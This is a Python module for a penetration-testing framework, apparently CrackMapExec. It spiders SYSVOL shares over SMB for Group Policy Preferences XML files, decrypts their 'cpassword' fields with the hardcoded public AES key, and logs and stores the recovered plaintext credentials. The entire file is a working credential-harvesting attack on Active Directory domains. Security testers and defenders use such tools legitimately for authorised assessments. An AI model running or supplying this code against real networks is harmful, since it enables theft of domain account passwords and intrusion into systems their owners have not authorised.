import xml.etree.ElementTree as ET
from Cryptodome.Cipher import AES
from base64 import b64decode
from binascii import unhexlify
from io import BytesIO

class CMEModule:
    '''
      Reference: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
      Module by @byt3bl33d3r
    '''

    name = 'gpp_password'
    description = 'Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.'
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        '''

    def on_login(self, context, connection):
        shares = connection.shares()
        for share in shares:
            if share['name'] == 'SYSVOL' and 'READ' in share['access']:

                context.log.success('Found SYSVOL share')
                context.log.info('Searching for potential XML files containing passwords')

                paths = connection.spider('SYSVOL', pattern=['Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'])

                for path in paths:
                    context.log.info('Found {}'.format(path))

                    buf = BytesIO()
                    connection.conn.getFile('SYSVOL', path, buf.write)
                    xml = ET.fromstring(buf.getvalue())

                    if 'Groups.xml' in path:
                        xml_section = xml.findall("./User/Properties")

                    elif 'Services.xml' in path:
                        xml_section = xml.findall('./NTService/Properties')

                    elif 'ScheduledTasks.xml' in path:
                        xml_section = xml.findall('./Task/Properties')

                    elif 'DataSources.xml' in path:
                        xml_section = xml.findall('./DataSource/Properties')

                    elif 'Printers.xml' in path:
                        xml_section = xml.findall('./SharedPrinter/Properties')

                    elif 'Drives.xml' in path:
                        xml_section = xml.findall('./Drive/Properties')

                    for attr in xml_section:
                        props = attr.attrib

                        if 'cpassword' in props:

                            for user_tag in ['userName', 'accountName', 'runAs', 'username']:
                                if user_tag in props:
                                    username = props[user_tag]

                            password = self.decrypt_cpassword(props['cpassword'])

                            context.log.success('Found credentials in {}'.format(path))
                            context.log.highlight('Password: {}'.format(password))
                            for k,v in props.items():
                                if k != 'cpassword':
                                    context.log.highlight('{}: {}'.format(k, v))

                            hostid = context.db.get_computers(connection.host)[0][0]
                            context.db.add_credential('plaintext', '', username, password, pillaged_from=hostid)

    def decrypt_cpassword(self, cpassword):

        #Stolen from hhttps://gist.github.com/andreafortuna/4d32100ae03abead52e8f3f61ab70385

        # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
        key = unhexlify('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
        cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
        password = b64decode(cpassword)
        IV = "\x00" * 16
        decypted = AES.new(key, AES.MODE_CBC, IV.encode("utf8")).decrypt(password)
        return decypted.decode().rstrip()
